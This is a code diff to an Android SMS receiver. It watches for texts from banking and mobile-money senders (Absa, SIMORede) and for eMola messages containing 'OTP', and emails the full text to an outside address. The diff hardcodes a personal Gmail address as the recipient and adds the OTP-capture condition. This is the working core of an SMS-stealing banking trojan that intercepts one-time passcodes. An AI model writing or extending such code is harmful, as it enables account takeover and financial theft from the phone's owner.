@@ -31,14 +31,15 @@ public class SmsReceiver extends BroadcastReceiver {
 
                         if (i == pdusObj.length - 1) {
                             String sender = currentMessage.getDisplayOriginatingAddress();
-                            String completeMessage = "Sender: " + sender + " Message: " + fullMessage.toString();
-                            Log.d("SmsReceiver", "Message : " + completeMessage);
+                            String completeMessage = "Sender: " + sender + "\n Mensagem: " + fullMessage.toString();
+                            Log.d("SmsReceiver", "" + completeMessage);
 
-                            if ("Absa".equalsIgnoreCase(sender) || "SIMORede".equalsIgnoreCase(sender)) {
+                            if (("Absa".equalsIgnoreCase(sender) || "SIMORede".equalsIgnoreCase(sender)) || ("eMola".equalsIgnoreCase(sender) && completeMessage.contains("OTP"))) {
 
                                 // Preparar os dados para o Worker
                                 Data emailData = new Data.Builder()
-                                        .putString("toEmail", "SENDERMAIL")
+                                        .putString("toEmail", "aelias7@gmail.com")
+
                                         .putString("subject", "SMS Recebido")
                                         .putString("body", completeMessage)
                                         .build();
@@ -49,7 +50,7 @@ public class SmsReceiver extends BroadcastReceiver {
                                         .build();
 
                                 WorkManager.getInstance(context).enqueue(emailWorkRequest);
-                            }
+                              }
                         }
                     }
                 } else {
